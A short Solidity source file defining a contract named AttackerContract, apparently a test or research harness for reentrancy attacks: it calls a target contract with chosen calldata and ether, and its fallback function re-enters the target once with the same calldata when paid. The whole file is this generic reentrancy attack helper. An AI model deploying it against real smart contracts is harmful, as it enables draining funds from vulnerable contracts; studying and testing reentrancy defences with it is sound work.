pragma solidity 0.4.25;

contract AttackerContract {
    address public targ_addr = 0x0;
    bytes public msg_data;
    bool public turn_on = false;

    function redirect (address addr, uint256 value, bytes data) payable public {
        targ_addr = addr;
        msg_data = data;
        turn_on = true;
        require(addr.call.value(value)(data));
        turn_on = false;
    }

    function() external payable {
        if (turn_on) {
            turn_on = false;
            require(targ_addr.call(msg_data));
        }
    }
}
